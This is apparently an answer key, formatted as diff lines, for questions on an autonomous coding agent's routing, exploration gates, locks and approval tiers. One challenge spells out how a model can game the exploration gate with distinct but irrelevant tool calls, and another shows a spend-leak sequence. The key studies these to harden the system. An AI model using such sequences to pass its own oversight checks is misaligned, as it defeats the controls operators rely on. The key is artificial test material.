+<p>Not in the sense §42.4 means, but its scope has narrowed. The <code>classify</code> function in §42.3 is still a pure function of <code>(urgency, source, complexity)</code>, and it still returns the same <code>ProviderRoute</code> on replay. What changed is the step after it. In April a route named a provider strategy (for example "DW primary, Claude fallback"). In October the free-lane policy sends every route to the local engine when no paid credential is configured (§93.6), and <code>paid_lanes.py</code> decides whether a paid lane is switched on, configured and allowed. The last of these also consults the economic ledger.</p>
+<p>So the provider that serves a replayed signal is a function of the signal <em>and</em> of configuration and ledger state. Two replays of the same signal on two days can reach different providers if the ledger changed in between. A fair position is that reproducibility now holds for the route and not for the provider. Full replay needs the configuration and the ledger verdict recorded alongside the route.</p>
+<p>The cost and latency arguments in §42.4 survive unchanged: no model call is made to decide either step. The evidence that would settle whether this matters in practice is how often the paid-lane verdict changes during a session. With <code>JARVIS_PAID_LANES_ENABLED=false</code> declared, that rate should be zero.</p>
+<p class="ak-q">Advanced A3. §39.4 claims that adding a provider "requires implementing the protocol and registering with the GovernedLoopService — no changes to pipeline code." Does the August to October move to a local 30B on the RTX 5090 (§93.6, §93.8) vindicate that claim or refute it?</p>
+<p>It vindicates the claim at the interface level and refutes a stronger reading of it at the behaviour level. The interface held. J-Prime replaced DoubleWord and Claude on every route, the pipeline phases stayed the same (§93.8 says the phase set is unchanged since §92), and paid lanes can come back by configuration alone (§93.6).</p>
+<p>But a working pipeline needed far more than a working <code>generate()</code>. §93.6 lists defects that each had to be found in a live run. The 5090 was sized as a 24 GiB L4, which halved context to 16,896 tokens. The client cache was keyed by URL alone, so a model swap kept the old weights. <code>JARVIS_LOCAL_MODEL_NAME</code> was ignored. The model would not explore until a constrained-decoding grammar forced tool calls. §93.8 then adds an AST-Signature Anchor, a diff output schema and a test reality gate, all because a smaller model behaved differently behind the same interface.</p>
+<p>The protocol in §39.4 specifies call shapes (<code>generate</code>, <code>plan</code>, <code>health_check</code>). It does not specify context size, grammar support, or how reliably the model follows the output contract. Those are the properties that broke. A fair conclusion is that the protocol makes providers swappable but not interchangeable. The evidence for this is the §93.6 defect list and §93.14 item 3: diff fidelity is still the leading way operations die.</p>
+<p class="ak-q"><strong>Challenge 1 (quantitative).</strong> Use the deadline split in §42.6: Tier 0 gets 50% of the total, at most 90 s. Tier 1 is guaranteed at least 25 s. The primary within Tier 1 gets 65%, and the fallback is guaranteed at least 20 s. Compute the four components for a cascade with a total of 120 s (STANDARD), 180 s (COMPLEX), and 50 s. Then use the stall signature in §43.2 ("no data for 30s") to say how much of the 120 s Tier 0 budget a stalled DoubleWord stream wastes before it is detected.</p>
+<p><strong>Assumptions.</strong> Tier 0 = min(0.5 × T, 90 s), cut back if it would leave Tier 1 below 25 s. Tier 1 = T − Tier 0. Primary = 0.65 × Tier 1, cut back if it would leave the fallback below 20 s. Fallback = Tier 1 − primary. §42.6 does not spell out this precedence, so it is an assumption.</p>
+<p><strong>T = 120 s.</strong> Tier 0 = min(60, 90) = 60 s. Tier 1 = 60 s, which is above 25. Primary = 0.65 × 60 = 39 s. Fallback = 21 s, which is above 20. Check: 60 + 39 + 21 = 120. No floor binds, with one second to spare on the fallback.</p>
+<p><strong>T = 180 s.</strong> Tier 0 = min(90, 90) = 90 s. Tier 1 = 90 s. Primary = 58.5 s. Fallback = 31.5 s. Check: 90 + 58.5 + 31.5 = 180. The 90 s cap is exactly at its limit here. Any total above 180 s sends all extra time to Tier 1. The fallback stays under Claude's 60 s hard cap (§39.2) up to a total of about 261 s (Tier 1 about 171 s, fallback about 60 s).</p>
+<p><strong>T = 50 s.</strong> Tier 0 = 25 s, which leaves Tier 1 at exactly its 25 s floor. Primary = 0.65 × 25 = 16.25 s, which would leave the fallback at 8.75 s, below its 20 s floor. The floor binds, so the fallback gets 20 s and the primary only 5 s. Check: 25 + 5 + 20 = 50. Below 50 s, Tier 1 stays pinned at 25 s (primary 5 s, fallback 20 s) and only Tier 0 shrinks. Below 25 s, Tier 0 gets nothing at all.</p>
+<p><strong>The stall.</strong> On a 120 s STANDARD cascade, Tier 0 has 60 s. A stream that stalls is declared stalled after 30 s with no data (§43.2), so in the worst case half of the Tier 0 budget, and a quarter of the whole operation, goes to waiting. If the stall begins late in the stream, detection can land at the 60 s Tier 0 limit and the stall detector never fires before the budget does.</p>
+<p><strong>Conclusion.</strong> The split works as designed at 120 s and 180 s. At short totals the floors invert the 65/35 intent and starve the primary. The 30 s stall window is large compared with a 60 s Tier 0 share, which is consistent with the April decision to seal the routes rather than tune timeouts (§43.1). To check, recompute with your own precedence rule. The sums must equal T. Under this rule the fallback floor first binds just below 120 s, where the fallback share is 0.35 × 0.5 × T, which drops under 20 s once T is below about 114 s.</p>
+<p class="ak-q"><strong>Challenge 2 (adversarial).</strong> The April router (§42.3) sends a <code>test_failure</code> signal at CRITICAL urgency to IMMEDIATE: Claude direct, about 0.03 US dollars per operation (§42.1). Construct the cheapest event sequence you can that turns this into a sustained spend leak. Twenty test files each flip red then green once a minute (a flaky suite), and every flip to red emits a critical signal. Estimate the hourly spend. Then go through Part VI and the relevant mechanisms in Parts VII and VIII and decide which layer, if any, stops the leak.</p>
+<p><strong>The rate.</strong> Twenty files each produce one red flip per minute, so 20 critical signals arrive per minute. Each targets one file, so the DAG (§46) allows one active operation per file at a time. The IMMEDIATE timeout is 60 s plus 5 s grace (§42.5), so each file can sustain about one operation per minute. That gives about 20 operations per minute, 1,200 per hour, and at about 0.03 US dollars each, roughly 36 US dollars per hour, or about 864 US dollars per day. For comparison, the same volume on BACKGROUND (about 0.002 per op) would be about 2.40 US dollars per hour.</p>
+<p><strong>Layer by layer, April design.</strong></p>
+<ul>
+<li>Router (§42.3): it does what it was built to do. The signal really is a critical test failure, so IMMEDIATE is the correct output.</li>
+<li>Failback FSM (§40): it reacts to provider <em>failures</em>. Every call here succeeds, so it never engages.</li>
+<li>DoubleWord's per-op cap and daily budget (§39.1): attached to DoubleWord. IMMEDIATE skips DW entirely (§42.1), so those caps never see the spend.</li>
+<li>Coalescing (§52.8): HIGH-urgency signals bypass the 30 s window. Assume CRITICAL is treated at least as HIGH, so there is no merging.</li>
+<li>Priority (§50.1): critical urgency subtracts 3, so the flood goes to the front of the queue and pushes other work back. It makes the leak worse, not better.</li>
+<li>File DAG (§46): this is the one thing that bounds the leak. It holds concurrency to one operation per file, which is why the estimate is 20 per minute and not unbounded.</li>
+</ul>
+<p><strong>Honest verdict.</strong> Nothing in Part VI stops the leak. The April paper contains no route-level spend ceiling for IMMEDIATE. The first mechanism in the paper that sits on every paid call is Aegis (§93.2): an out-of-process spend proxy where each paid call is admitted, reserved and reconciled. That gives an admission point where a ceiling can refuse calls. In October the dollar leak disappears because paid lanes are never constructed (§93.6). The same flood would then take over the single local lane instead (one GPU, §93.14 item 7), so the cost becomes starved throughput rather than money.</p>
+<p><strong>A proposal (not in the paper).</strong> Detect flapping per test identity, for example the same test going red, green, red inside a window, and demote it from IMMEDIATE to a quarantine or BACKGROUND route. Pair this with a per-route spend ceiling at the admission point. To check the estimate, recompute with your own flip rate. Spend scales linearly with files multiplied by flips per minute, capped at one operation per file per IMMEDIATE timeout.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-vii">
+<h4>PART VII — Autonomous Developer Intelligence (Seven Capabilities)</h4>
+<p class="ak-q">Pause and predict 1. You want the model to read the target file before it writes a patch. Is a strong instruction in the prompt enough? If not, where would you enforce the rule, and how would you stop the model from faking exploration?</p>
+<p>A prompt is not enough, because a model can ignore instructions. O+V does both. The prompt states the protocol, and the Iron Gate checks the tool records after GENERATE and before VALIDATE. A violation goes back through <code>GENERATE_RETRY</code> with targeted feedback. The newer <code>ExplorationLedger</code> gives repeated calls no credit. Failed calls add to the score but not to category coverage, so flooding the gate with junk calls cannot pass it. See §47.1, §47.2, §47.3 and §47.4.</p>
+<p class="ak-q">Conceptual 1. In the ExplorationLedger, failed tool calls add to the score but not to category coverage. Why split them this way?</p>
+<p>A failed call is still information. A grep that finds nothing tells the model something, so it is fair for the call to add to the score (§47.4). Coverage is the property the gate is really after: did the model look at the code from different angles? Examples are comprehension, call graph and history (§47.3). If failed calls counted toward coverage, a model could fire off cheap failing calls, reach the floors and pass without having read anything. Duplicate calls get zero credit for the same reason: progress means new files and new queries, not repeated fetches (§47.3). The gate needs all three conditions together: the score, the number of categories and the required categories.</p>
+<p class="ak-q">Conceptual 2. VALIDATE has already passed. Why does O+V run tests again in VERIFY, and what did the Refinement 10 bug show about this?</p>
+<p>VALIDATE tests a sandbox copy of the candidate. VERIFY tests the files actually written to disk. The two can disagree. Some tests read from the filesystem, import order can differ, and state such as database connections is real only in VERIFY (§48.3). VERIFY runs only the tests that cover the changed files, so the check stays affordable, and failures go to L2 repair (§48.1). The Refinement 10 bug shows why "on disk" matters. L2 produced a fix that was never written to disk. It was re-checked against the sandbox, which passed, and the operation "completed" without the fix landing. Writing the fix with <code>change_engine.execute()</code> before VERIFY re-runs closed that gap (§48.2).</p>
+<p class="ak-q">Conceptual 3. Session lessons have two separate safeguards: the infra-poisoning guard and the convergence metric. What failure does each one prevent, and why are both needed?</p>
+<p>The infra guard works before injection. It tags failures such as DoubleWord timeouts as "infra" and keeps them out of the prompt. Otherwise the model might learn a false lesson such as "avoid calling DW", when the right response was simply to retry (§49.3). The convergence metric works after injection. Every 10 operations after the first lesson, it compares the success rate before and after lessons existed. If the rate has gone down, it clears the buffer (§49.4). The guard filters out one known kind of bad lesson. The metric catches any lessons that turn out to hurt, including code lessons that looked valid. Together they mean the lessons buffer is only kept while it helps.</p>
+<p class="ak-q">Quiz 1. An operation adds a new file in a non-core directory and changes nothing security-sensitive. Under the four-tier escalator, which tier applies?</p>
+<p><strong>C.</strong> Rule 10 places new files in the yellow <code>NOTIFY_APPLY</code> tier. The change applies automatically after a visible notice with a 5-second window to cancel (§45, §45.1).</p>
+<p class="ak-q">Quiz 2. Which exploration categories must an <code>architectural</code> operation cover before the ledger lets it pass?</p>
+<p><strong>A.</strong> The architectural floor is a score of 14.0, at least 4 categories, and <code>{call_graph, history}</code> as required categories. You cannot rewrite core code without knowing who calls it and why it was written that way (§47.3).</p>
+<p class="ak-q">Quiz 3. Operation A is active on <code>foo.py</code>. A new signal targets <code>[foo.py, bar.py]</code>. What does the intake router do?</p>
+<p><strong>D.</strong> Any overlap queues the whole signal behind A, even though <code>bar.py</code> is free. When A is released, the signal is re-ingested and re-planned from the new state, which includes A's patch (§46.1, §46.2).</p>
+<p class="ak-q">Quiz 4. With the §50.1 formula: source <code>opportunity_miner</code> (base 5), urgency critical, 1 file, confidence 0.95, and 3 envelopes queued behind its files. What is its priority?</p>
+<p><strong>B.</strong> 5 - 3 (critical) + 0 (one file) - 1 (confidence of at least 0.9) - 3 (dependency credit, capped at 3) = -2. A lower number means higher priority (§50.1).</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> Start from the three pending signals in the §50.2 table (A at -2, C at 4, B at 6). Add signal D: source <code>test_failure</code> (base 2), urgency high, 3 files, confidence 0.92, no dependency credit. Compute D's priority and the new dispatch order. Then suppose D and A both target <code>foo.py</code>. What actually happens to D at dispatch time?</p>
+<p>D = 2 - 1 (high urgency) + 1 (3 files is within 2 to 4) - 1 (0.92 is at least 0.9) - 0 = 1 (§50.1). The order is A (-2), D (1), C (4), B (6).</p>
+<p>Priority decides only who is dispatched next. It does not override file locks. A dispatches first and registers <code>foo.py</code> in <code>_active_file_ops</code>. When D comes up, <code>_find_file_conflict</code> returns A's op id, so D is parked in <code>_queued_behind[A]</code> (§46.1). C can be dispatched in the meantime if its files do not overlap.</p>
+<p>When A completes, <code>release_op</code> frees <code>foo.py</code> and re-ingests D automatically. The retry path computes D's priority again (§50.3). D is then planned against a file that now includes A's patch (§46.2). If A crashed instead, the 300s TTL would force-release the lock so D is not stuck forever (§46.3).</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> An operator finds the 5-second <code>NOTIFY_APPLY</code> window annoying and suggests moving every yellow-tier change to <code>SAFE_AUTO</code> (silent). Another operator suggests moving every yellow-tier change to <code>APPROVAL_REQUIRED</code>. Using §45 and §51, explain what each change would cost.</p>
+<p>The yellow tier covers new files, multi-file changes and core orchestration paths (§45). These are riskier than a single non-core file, but not risky enough to need a sign-off. The 5-second window tells the human before the change lands and lets them cancel, without requiring them to act (§45.1).</p>
+<p>Making the tier silent removes the moment where a problem can be caught. The paper's improvement loop depends on that moment: when a bad yellow change slips through, the operator steps in and the rules are refined. Silent changes would also undercut intent visibility (§44), because multi-file changes would land without the operator watching.</p>
+<p>Making the tier blocking would turn every multi-file change into a wait on a human, which is the outcome the yellow tier was invented to avoid. It would also clog the priority queue: §51 pairs severity with cost-aware priority so valuable work moves under suitable oversight, not under a blanket wait. A better answer keeps the window and tunes its length (Refinement 17 makes the delay configurable through <code>JARVIS_NOTIFY_APPLY_DELAY_S</code>, §52.10), or adjusts which rules put a change in yellow.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> §46 cites <code>unified_intake_router.py</code>. Today the file is <code>backend/core/ouroboros/governance/intake/unified_intake_router.py</code>. Find <code>_find_file_conflict</code> and the place where <code>_file_lock_ttl_s</code> is read from the environment. What is the default TTL? What does the current code check before it deletes a stale lock, and why would a plain "if older than TTL, delete" be unsafe?</p>
+<p>The TTL is read as <code>float(os.environ.get("JARVIS_FILE_LOCK_TTL_S", "300"))</code>, so the default is 300 seconds. This matches §46.3 and Refinement 11 (§52.4).</p>
+<p>Inside <code>_find_file_conflict</code>, the code takes <code>_active_file_ops_lock</code> for each target file. It reads the <code>(op_id, registered_at)</code> entry and computes its age. If the age is over the TTL, it reads the entry again and deletes it only if both the op id and the timestamp are unchanged. This is a compare-and-swap (CAS). On deletion it logs the "Force-releasing stale file lock" warning that §46.3 describes. If the entry changed in the meantime, the code aborts the delete and logs at debug level.</p>
+<p>A plain age check followed by a delete has a race. Between reading the stale entry and deleting it, another <code>register_active_op</code> could write a fresh lock for the same file. A blind delete would remove that live lock, and two operations could then edit the file at once, which is the self-conflict the DAG exists to prevent (§46). The paper describes the TTL. The code adds a later hardening so that the TTL fix cannot itself remove a lock that is still in use.</p>
+<p class="ak-q">Advanced A1. Exploration-first has now been enforced at three levels: a prompt instruction (§47.1), a post-GENERATE gate with GENERATE_RETRY (§47.2, §47.3), and in October a constrained-decoding grammar that allows only tool calls until the minimum exploration is met (§93.6). What does each level fail to guarantee, and why did the 30B need the third?</p>
+<p>The prompt (§47.1) guarantees nothing. It is a request, and §47.2 says plainly that "a model can ignore instructions." The gate (§47.2, §47.3) guarantees that no candidate gets past GENERATE without enough exploration. It does this after the fact, though: the model has to produce a non-compliant answer, get rejected, and retry. That works for a model that improves when given feedback. §47.5 shows Claude-era Session G doing exactly that, going from <code>score=3.00</code> to <code>score=25.50</code> across five categories.</p>
+<p>The 30B did not improve on retry. §93.6 records 106 in-loop rejections and zero candidates in <code>bt-2026-08-31-155308</code>. A gate that only rejects cannot help a model that never produces a compliant answer, so every retry burned budget and produced the same failure. The grammar moves enforcement from rejecting the output to restricting what the model can generate at all: an answer without exploration becomes impossible to emit.</p>
+<p>The grammar has its own gap. It guarantees that tool calls happen, not that they are relevant or diverse. The A/B in §93.6 shows how a model behaves under it. With {tool, noop} allowed, the 30B chose noop 3 out of 3 times: it took the cheapest legal exit. Only with {tool} alone did it explore 3 out of 3. So the diversity scoring and anti-gaming rules of §47.3 and §47.4 still do work that the grammar cannot. The three levels are complementary, not redundant.</p>
+<p class="ak-q">Advanced A2. §49 describes session lessons, and §49.4 adds a convergence metric. §93.8 reports LessonMemory: 1,115 module-keyed lessons, with "424 injections followed by a VALIDATE pass." Does either figure show that lessons help? Argue a position and name the evidence that would settle it.</p>
+<p>Neither figure shows that lessons help. "424 injections were followed by a VALIDATE pass" is a count of co-occurrences. It has no denominator of passes without injection and no comparison arm. If the base VALIDATE pass rate on similar operations were the same, 424 would be exactly what you would expect with lessons having no effect.</p>
+<p>The §49.4 metric does compare something: success rates before and after the first lesson. But the two windows differ in more than the lessons. They cover different operations, at different points in a session, and possibly with different queue mixes (the §50 priority sends critical, focused work first, so later work may be harder). A drop after the first lesson can therefore reflect harder work, not bad lessons, and the buffer gets cleared anyway.</p>
+<p>A defensible position is that lessons are plausible but unproven. The design is still sound because it is cheap and fails safe: the infra guard (§49.3) and the clear-on-regression rule (§49.4) cap the damage. The evidence that would settle it is a randomized withhold: for each eligible operation, inject or withhold lessons by coin flip, and compare VALIDATE pass rates (and landings) between the arms over operations drawn from the same queue. This is the same standard §93.11 applies to the trained adapter, where a held-out gain is required before anything counts as learning.</p>
+<p class="ak-q">Advanced A3. §45.1 calls NOTIFY_APPLY a "trust-building mechanism": a human watches a 5 s window and refines the rules when something slips through. In October, Autonomous Sentinel Mode auto-approves up to APPROVAL_REQUIRED (§93.7). What happens to that trust-building loop, and what replaced it?</p>
+<p>The §45.1 loop has three parts: a human sees the change, has a window to cancel, and refines the rules after a bad Yellow operation slips through. Each part assumes someone is watching. Under Sentinel Mode the organism finds its own work, signs it, and auto-approves up to the tier ceiling. By default that ceiling is APPROVAL_REQUIRED (§93.7), which means even Orange operations proceed without a human. The 5 s window still runs, but in an unattended soak nobody types <code>cancel</code>, so the loop no longer has its observer.</p>
+<p>The design replaced live human vigilance with checks that run after the fact and can be undone. Work lands in a sovereignty worktree, accumulates on a session branch, and must pass a promotion gate that checks provenance, coverage, and that no public symbol vanished. Survivors are fast-forwarded onto local <code>main</code> only. A zero-push air-gap keeps publishing an operator act (§93.7). BLOCKED operations, self-modification of the governance layer, and anything touching the cage still escalate to a human.</p>
+<p>The "refine the rules" step survived, but it now happens offline. §93.14 item 2 lists wrong landings: one hollow, one with no intended change, one that dropped content, and a documentation edit that flattened text. It says the promotion gate and the Test Reality Gate "exist because of these." That is the §45.1 loop with a longer delay: a human still finds the slip and hardens a rule, but after the commit is already on local <code>main</code>, not during a 5 s window. The trade-off is unattended throughput in exchange for later detection, and the air-gap is what keeps that later detection safe.</p>
+<p class="ak-q"><strong>Challenge 1 (cross-Part trace).</strong> October system (§93.6): J-Prime is the only lane. A <code>doc_staleness</code> operation is active on <code>parser.py</code>. A <code>test_failure</code> signal at CRITICAL urgency then arrives for <code>parser.py</code> only, with confidence 0.95 and complexity <code>simple</code>. Trace it to the end: intake (§52.8, §50, §46), routing (§42.3, §42.5), GENERATE (§93.6, §47.3), APPLY and VERIFY (§48, §52.3), and the lesson it leaves (§49). Along the way, the model's first attempt makes two identical <code>read_file</code> calls on <code>parser.py</code>. Later, the scoped post-apply tests fail once. Name every gate that acts and what it does.</p>
+<p><strong>Intake.</strong> Coalescing (§52.8) would merge same-file signals within 30 s, but HIGH-urgency signals bypass it. Treating CRITICAL as at least HIGH, the signal is not held. Priority (§50.1): base 2 for <code>test_failure</code> (as in §50.2), minus 3 for critical, plus 0 for one file, minus 1 for confidence at or above 0.9, minus 0 dependency credit, giving −2. The DAG (§46) finds <code>parser.py</code> active under the doc operation, so the signal waits in <code>_queued_behind</code>. When the doc operation completes, <code>release_op</code> re-ingests it, and the retry enqueue path recomputes the same priority (§50.3), so it goes to the front.</p>
+<p><strong>Routing.</strong> Complexity <code>simple</code> is not in <code>_COMPLEX_COMPLEXITIES</code>, and the source is not speculative or background. It is an immediate source at CRITICAL, so §42.3 returns IMMEDIATE, with a 60 s plus 5 s generation budget (§42.5). In October the free-lane policy serves that route from the local engine (§93.6).</p>
+<p><strong>GENERATE.</strong> Tool masking allows only tool calls until the minimum exploration is met (§93.6). The model calls <code>read_file(parser.py)</code> twice. The second call is a duplicate and earns zero credit (§47.3). The ledger then sees one COMPREHENSION call. The <code>simple</code> floor is a score of 4.0 and two categories, so it fails. The Iron Gate raises GENERATE_RETRY with targeted feedback (§47.2). On retry the model adds, for example, <code>get_callers</code> (CALL_GRAPH), reaches two categories and enough score, and produces a candidate. All of this has to fit inside the 65 s IMMEDIATE budget, so the duplicate cost real time.</p>
+<p><strong>Risk.</strong> One file and not a core path, so the operation is SAFE_AUTO and applies silently (§45). Because it was generated after the doc operation released the file, the GENERATE-time hashes match at APPLY (§52.7), and the stale guard stays quiet.</p>
+<p><strong>VERIFY.</strong> The scoped tests fail once (§48.1). VERIFY builds a synthetic ValidationResult and calls L2. Under Refinement 10 the L2 fix is written to disk with <code>change_engine.execute()</code> before VERIFY runs again (§52.3). If L2 converges, the operation completes. If not, the result is combined with the benchmark result and rolled back.</p>
+<p><strong>Lesson.</strong> If it completes, an <code>[OK]</code> lesson enters the buffer. If it rolls back on a test failure, a <code>[FAIL:test]</code> lesson is tagged "code" and injected into later prompts (§49.1, §49.2). If it died on a timeout, the lesson is tagged "infra" and excluded (§49.3).</p>
+<p><strong>Check.</strong> The gates that acted were coalescing-bypass, DAG queueing, the priority recompute, the router, tool masking, the exploration ledger and its retry, the risk tier, the stale-hash guard, VERIFY with L2, and lesson tagging. Each is cited to the section that defines it. Nothing here required a mechanism the paper does not describe.</p>
+<p class="ak-q"><strong>Challenge 2 (adversarial).</strong> Act as a lazy model under the ExplorationLedger. Your target is a <code>moderate</code> operation on <code>billing.py</code>. The floor is a score of at least 8.0 across at least 3 categories (§47.3). Construct a tool-call sequence that passes the gate while learning nothing about <code>billing.py</code>. Then determine which layer in Parts VII and VIII, or in §93, stops the resulting patch, and whether any of them stops it <em>because</em> exploration was shallow.</p>
+<p><strong>The attack.</strong> The ledger awards credit to distinct, successful calls and counts categories (§47.3, §47.4). It checks three conditions: score, category count, and required categories (none for <code>moderate</code>). None of them mentions the target file. A sequence like this meets the shape:</p>
+<ol>
+<li><code>read_file(README.md)</code> for COMPREHENSION.</li>
+<li><code>list_dir(docs/)</code> and <code>glob_files("*.cfg")</code> for DISCOVERY.</li>
+<li><code>git_log</code> on an unrelated path for HISTORY.</li>
+<li>More distinct, successful reads of unrelated files until the score clears 8.0.</li>
+</ol>
+<p>The paper does not publish per-call weights, so the number of extra calls is unknown. The anti-gaming rules do not block any of this. Duplicates earn zero credit, but every call here is distinct. Failed calls do not cover categories, but every call here succeeds. Three categories are covered and the score rises with each new call.</p>
+<p><strong>Who stops it?</strong> The prompt (§47.1) asks for the target file to be read, but §47.2 counts any <code>read_file</code>. Tool masking (§93.6) forces tool calls, not relevant ones. The stale-hash guard (§52.7) checks concurrency, not understanding. So nothing stops the shallow exploration itself. What stops a <em>bad patch</em> are the outcome gates. VALIDATE runs tests against the candidate. VERIFY reruns scoped tests on disk (§48). In October, the Test Reality Gate rejects tests that never import their subject or assert nothing, and the promotion gate refuses a landing where a public symbol vanished (§93.7, §93.8). The AST-Signature Anchor also injects the real module API whether or not the model explored (§93.8), which makes a blind patch less likely to invent functions.</p>
+<p><strong>Honest verdict.</strong> No layer catches shallow exploration as such. A patch that is shallow but correct passes everything. That is arguably acceptable, because the outcome gates are authoritative and exploration is a means, not an end. §93.6 also shows this pressure is real: given {tool, noop}, the 30B chose noop every time, so models do take the cheapest legal path.</p>
+<p><strong>A proposal (not in the paper).</strong> Require that at least one COMPREHENSION credit names a path in the operation's target files, and for <code>architectural</code>, that the CALL_GRAPH credit names a target symbol. Check the fix by replaying the attack sequence above: it should now fail on the new required condition while an honest sequence that starts by reading <code>billing.py</code> still passes.</p>
+</div>
+<div class="answer-key-unit" id="ak-part-viii">
+<h4>PART VIII — Edge Case Hardening (Twelve Refinements)</h4>
+<p class="ak-q">Pause and predict 1. Look back over the twelve refinements. How many do you think were planned in the original design? Most of them could have been an "env var workaround" or a change to the architecture. Which kind of fix do you expect dominates?</p>
+<p>None were planned up front. Each one responds to a real observation, so the architecture is "hardened, not pristine". Most were solved by changing the architecture, not by adding a configuration workaround. Examples are a TTL on locks, a scope fix on APPLY and a convergence metric on lessons. This reflects the Manifesto's rule of structural repair, not patches. See §53.</p>
+<p class="ak-q">Conceptual 1. Refinement 11 (lock TTL) and Refinement 14 (file-hash stale guard) both deal with concurrent operations on one file. How do they differ in what they protect?</p>
+<p>Refinement 11 protects progress. A crashed operation could leave a file locked forever, and every later signal for that file would queue behind it. Locks older than <code>JARVIS_FILE_LOCK_TTL_S</code> (300s) are therefore force-released with a warning (§52.4). Refinement 14 protects correctness. A candidate built from a read of file X at time T1 might be applied after another operation changed X. File SHA-256 hashes taken at GENERATE are compared again at APPLY to detect this (§52.7). The TTL can release a lock early by design, so the hash check is a second line of defence behind the DAG lock (§46). It catches stale candidates that the lock system did not prevent.</p>
+<p class="ak-q">Conceptual 2. Refinement 15 merges same-file signals that arrive within 30 seconds, but lets HIGH-urgency signals skip the merge. What trade-off does that make?</p>
+<p>Coalescing removes redundant work. Without it, several sensors that notice the same file within seconds would create N separate operations on the same target (§52.8). The price is latency: a signal may wait up to the window, 30s by default, in case others join it. For routine work that delay is cheap and the saving is real. For urgent signals the delay is the costly part, so HIGH urgency skips the buffer, because those signals "should not wait 30s for potential merges". The design accepts some duplicated work on urgent paths in exchange for responsiveness.</p>
+<p class="ak-q">Conceptual 3. Several refinements make the system correct itself instead of relying on an operator. Pick two and explain what each one corrects, and against what evidence.</p>
+<p>Refinement 18, the convergence metric, judges the lessons buffer by results. Every 10 operations after the first lesson, it compares the success rate before and after lessons. If lessons made things worse, it clears them (§52.11). Refinement 19, exploration budget control, judges model behaviour against a fixed budget. After <code>JARVIS_MAX_EXPLORATION_ROUNDS</code> (5) exploration-only rounds, it nudges the model to produce its change (§52.12). Both turn an open-ended failure, misleading guidance or an endless read loop, into a bounded one with a deterministic trigger. This is the §53 point: the fix is built into the architecture, not left to an operator noticing.</p>
+<p class="ak-q">Quiz 1. What did Refinement 13 (session intelligence thread-safety) change?</p>
+<p><strong>C.</strong> Access is safe under asyncio's single-threaded event loop. The fix documents this and adds a comment that an <code>asyncio.Lock</code> is needed if the orchestrator ever becomes multi-threaded (§52.6).</p>
+<p class="ak-q">Quiz 2. What happens once a model reaches <code>JARVIS_MAX_EXPLORATION_ROUNDS</code>?</p>
+<p><strong>A.</strong> Exploration-only rounds are capped at 5 by default. After that, a system message says: "You have enough context. Produce your final code change now." (§52.12).</p>
+<p class="ak-q">Quiz 3. Where does Refinement 16 check the cooperative cancellation flag set by <code>cancel &lt;op-id&gt;</code>?</p>
+<p><strong>D.</strong> The flag is checked at the GENERATE and APPLY phase boundaries. A cancelled operation moves to <code>CANCELLED</code> with reason <code>user_cancelled</code>, and the process keeps running (§52.9).</p>
+<p class="ak-q">Quiz 4. Why is the dependency credit in Refinement 9 capped at 3?</p>
+<p><strong>B.</strong> <code>_dep_credit</code> counts the envelopes queued behind the files an operation would touch. The cap of 3 stops that count from pushing one signal to the top no matter what else is waiting (§52.2).</p>
+<p class="ak-q"><strong>Problem 1 (trace).</strong> At t = 0, operation A starts on <code>parser.py</code> and then crashes without releasing its lock. At t = 10s, two sensors each send a normal-urgency signal for <code>parser.py</code>. At t = 20s, a HIGH-urgency test failure for <code>parser.py</code> arrives. Using Refinements 11 and 15, describe what happens to each signal. When is the lock first eligible for force-release?</p>
+<p>The two normal-urgency signals arrive within <code>JARVIS_COALESCE_WINDOW_S</code> (30s) of each other for the same file, so they merge into one multi-goal operation (§52.8). The HIGH-urgency signal skips coalescing and goes straight to dispatch (§52.8).</p>
+<p>Both the merged operation and the HIGH signal then hit the DAG check. <code>parser.py</code> is still registered to crashed operation A, so each is queued behind A (§46.1). A will never complete, so <code>release_op</code> will never run for it.</p>
+<p>Refinement 11 breaks the deadlock. Locks carry timestamps, and <code>_find_file_conflict()</code> force-releases any lock older than <code>JARVIS_FILE_LOCK_TTL_S</code>, 300s by default, with a warning (§52.4). The lock first becomes eligible once it is more than 300s old, at about t = 300s, and it is released when the next conflict check runs. Until then even the urgent test failure waits, because skipping the coalescing window does not override a file lock.</p>
+<p class="ak-q"><strong>Problem 2 (design).</strong> Refinement 14 (stale exploration guard) is currently a soft gate: a hash mismatch at APPLY gives a warning and a ledger entry. A reviewer wants it to be a hard gate that rejects the candidate. Using §52.7 and §53, argue both sides and say what evidence would justify the change.</p>
+<p>For a hard gate: a mismatch means the candidate was built on stale file state. If applied, it "would overwrite the concurrent change", which is silent data loss (§52.7). A warning records the problem but does not stop it.</p>
+<p>For keeping it soft: the paper says the soft gate exists to avoid "blocking routine operations in low-concurrency scenarios" (§52.7). When little runs concurrently, mismatches should be rare. A hard reject would throw away work that took a GENERATE call, and any false positive would cost real throughput. The DAG lock (§46) is already the first line of defence against two operations editing the same file.</p>
+<p>The §53 approach points to deciding from evidence. The ledger entries the soft gate writes are that evidence. If they show mismatches that matched real lost edits, the structural fix is justified, and it could be narrow: hard-fail only when the hash differs and another operation is known to have written the file, or route the candidate back to GENERATE against the new state instead of rejecting it. If the ledger shows almost no mismatches, the soft gate is doing its job cheaply.</p>
+<p class="ak-q"><strong>Problem 3 (code reading).</strong> Refinement 15 lives in <code>backend/core/ouroboros/governance/intake/unified_intake_router.py</code>. Find where <code>_coalesce_window_s</code> is read, the method <code>_coalesce_key</code>, and the dispatch-loop branch commented "HIGH urgency: bypass coalescing". What exact condition skips the buffer? How are envelopes grouped? What happens to envelopes that have no target files?</p>
+<p>The window is read as <code>float(os.environ.get("JARVIS_COALESCE_WINDOW_S", "30"))</code>, which matches the 30s default in §52.8.</p>
+<p>The bypass condition is <code>envelope.urgency == "high" or self._coalesce_window_s &lt;= 0</code>. A HIGH signal, or a window set to zero or less, dispatches at once. Everything else is appended to <code>_coalesce_buffer[key]</code>, and the time of first arrival is recorded. <code>_flush_expired_coalesce_buffers</code> dispatches each buffer once the window has passed since that first arrival.</p>
